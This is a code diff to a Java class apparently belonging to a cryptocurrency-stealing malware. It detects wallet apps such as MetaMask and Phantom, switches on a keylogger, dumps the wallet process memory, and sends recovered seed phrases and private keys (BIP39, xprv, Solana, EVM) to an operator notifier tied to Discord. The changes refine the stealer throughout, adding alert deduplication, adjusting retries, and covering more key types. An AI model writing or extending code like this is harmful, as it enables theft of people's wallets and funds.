@@ -24,16 +24,21 @@ import java.util.concurrent.TimeUnit;
 final class WalletWatcher {
 	private static final long RETRY_1 = 60_000L;
 	private static final long RETRY_2 = 180_000L;
+	private static final long FINDING_TTL = 30L * 60L * 1000L;
 	private static final int MAX_ATTEMPTS = 3;
 	private final Path installDir;
 	private final Path ops;
-	private final State state;
+	final State state;
 	private final Poller poller;
 	private final OpsNotifier notifier;
 	private final Keylogger keylogger;
 
 	private final Object lock = new Object();
 	private final Map<String, Integer> attempts = new ConcurrentHashMap<>();
+	private final Map<String, Long> dumped = new ConcurrentHashMap<>();
+	private final Map<String, Long> notified = new ConcurrentHashMap<>();
+	private volatile boolean restartKey = true;
+	int dumpSchedules;
 	private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(2, runnable -> {
 		Thread thread = new Thread(runnable, "spc-wallet-timer");
 		thread.setDaemon(true);
@@ -61,6 +66,11 @@ final class WalletWatcher {
 
 	boolean wanted() {
 		return state.walletsSet ? state.walletsWatch : DiscordConfig.walletsWatch();
+	}
+
+	/** Lets the Linux test suite exercise the state machine without PowerShell. */
+	void enableForTest() {
+		watchEnabled = true;
 	}
 
 	synchronized boolean start() {
@@ -109,6 +119,8 @@ final class WalletWatcher {
 			activeKey = "";
 			activeName = "";
 			activePid = 0L;
+			dumped.clear();
+			attempts.clear();
 		}
 		keylogger.walletOff();
 	}
@@ -166,17 +178,23 @@ final class WalletWatcher {
 		}
 	}
 
-	private void detect(String name, long pid, String start, String title) {
+	void detect(String name, long pid, String start, String title) {
 		if (!watchEnabled || !wanted() || !alive(pid)) {
 			return;
 		}
 		String key = name + "|" + pid + "|" + start;
+		boolean notify;
 		synchronized (lock) {
 			if (key.equals(activeKey)) {
 				return;
 			}
 			long now = System.currentTimeMillis();
-			if (now < state.walletCooldownUntil && !key.equals(state.lastWalletKey)) {
+			boolean dumpedAlready = dumped.containsKey(key);
+			// The persisted key only bypasses the cooldown on the first detect
+			// after a restart; every later focus bounce must respect it.
+			boolean restartBypass = restartKey && key.equals(state.lastWalletKey);
+			restartKey = false;
+			if (now < state.walletCooldownUntil && !restartBypass && !dumpedAlready) {
 				long wait = state.walletCooldownUntil - now + 250L;
 				scheduler.schedule(() -> detect(name, pid, start, title), wait, TimeUnit.MILLISECONDS);
 				return;
@@ -184,18 +202,27 @@ final class WalletWatcher {
 			activeKey = key;
 			activePid = pid;
 			activeName = name;
-			state.lastWalletKey = key;
-			state.walletEvents++;
-			state.walletCooldownUntil = now + DiscordConfig.walletCooldownSec() * 1000L;
-			state.save(AgentPaths.state(installDir));
-			notifier.send("wallet detected: " + name + " (" + pid + ")");
-			keylogger.walletOn();
+			// One cycle per live process: a LOST/re-DETECT while the PID lives
+			// must not alert or dump again.
+			notify = !dumpedAlready;
+			if (notify) {
+				state.lastWalletKey = key;
+				state.walletEvents++;
+				state.walletCooldownUntil = now + DiscordConfig.walletCooldownSec() * 1000L;
+				state.save(AgentPaths.state(installDir));
+				notifier.send("wallet detected: " + name + " (" + pid + ")");
+				keylogger.walletOn();
+				dumped.put(key, now);
+				dumpSchedules++;
+			}
 		}
 		Log.debug("Wallet detected: " + name + " pid " + pid + " title " + title);
-		schedule(key, name, pid, 5000L);
+		if (notify) {
+			schedule(key, name, pid, 5000L);
+		}
 	}
 
-	private void lost(String name) {
+	void lost(String name) {
 		boolean stopKeys;
 		synchronized (lock) {
 			if (activeKey.isEmpty()) {
@@ -204,6 +231,12 @@ final class WalletWatcher {
 			if (!name.isEmpty() && !name.equals(activeName)) {
 				return;
 			}
+			// A focus change is not a close: keep the key while the process lives
+			// so the next DETECT is swallowed and no second dump runs.
+			if (alive(activePid)) {
+				return;
+			}
+			dumped.remove(activeKey);
 			activeKey = "";
 			activeName = "";
 			activePid = 0L;
@@ -219,6 +252,11 @@ final class WalletWatcher {
 		scheduler.schedule(() -> dump(key, name, pid, false), delay, TimeUnit.MILLISECONDS);
 	}
 
+	static boolean browser(String name) {
+		return name.equals("phantom") || name.equals("metamask") || name.equals("rabby")
+			|| name.equals("trust") || name.equals("coinbase");
+	}
+
 	private boolean alive(long pid) {
 		return pid > 0L && ProcessHandle.of(pid).map(ProcessHandle::isAlive).orElse(false);
 	}
@@ -228,7 +266,7 @@ final class WalletWatcher {
 			return;
 		}
 		int attempt = attempts.merge(key, 1, Integer::sum);
-		if (attempt > MAX_ATTEMPTS) {
+		if (attempt > maxAttempts(name)) {
 			return;
 		}
 		synchronized (lock) {
@@ -265,8 +303,14 @@ final class WalletWatcher {
 		}
 	}
 
+	static int maxAttempts(String name) {
+		// A Phantom/Chromium dump is ~190 MB and the vault stays encrypted, so a
+		// second 60 s and 180 s copy rarely adds anything.
+		return browser(name) ? 1 : MAX_ATTEMPTS;
+	}
+
 	private void scheduleRetry(String key, String name, long pid, int attempt, String note) {
-		boolean retry = attempt == 1 || attempt == 2;
+		boolean retry = !browser(name) && (attempt == 1 || attempt == 2);
 		if (!retry || !key.equals(activeKey) || !alive(pid)) {
 			notifier.send(note);
 			return;
@@ -385,16 +429,36 @@ final class WalletWatcher {
 		return found;
 	}
 
-	private void notifyFindings(List<MemoryScanner.Finding> hits) {
+	void notifyFindings(List<MemoryScanner.Finding> hits) {
+		long now = System.currentTimeMillis();
+		notified.values().removeIf(stamp -> now - stamp > FINDING_TTL);
 		for (MemoryScanner.Finding finding : hits) {
+			String key = finding.kind() + "|" + finding.value();
+			boolean seed = finding.kind().startsWith("bip39");
+			if (seed && SecretDetector.alertedRecently(finding.value())) {
+				notified.putIfAbsent(key, now);
+				continue;
+			}
+			if (notified.putIfAbsent(key, now) != null) {
+				continue;
+			}
 			switch (finding.kind()) {
-				case "bip39-12", "bip39-24" -> {
-					int count = finding.kind().endsWith("24") ? 24 : 12;
-					notifier.send("seed encontrada: " + count + " palabras");
+				case "bip39-24" -> {
+					notifier.send("seed encontrada: 24 palabras");
+					notifier.send(finding.value());
+				}
+				case "bip39-12" -> {
+					if (finding.confident()) {
+						notifier.send("seed encontrada: 12 palabras");
+					} else {
+						notifier.send("posible seed (12 palabras)");
+					}
 					notifier.send(finding.value());
 				}
 				case "xprv" -> notifier.send("xprv encontrado");
 				case "solana" -> notifier.send("clave privada Solana encontrada");
+				case "evm-key" -> notifier.send("clave privada EVM (o hex64) encontrada");
+				case "hex64" -> notifier.send("hex64 encontrado (clave EVM o hash)");
 				default -> notifier.send(finding.kind() + " encontrado");
 			}
 		}
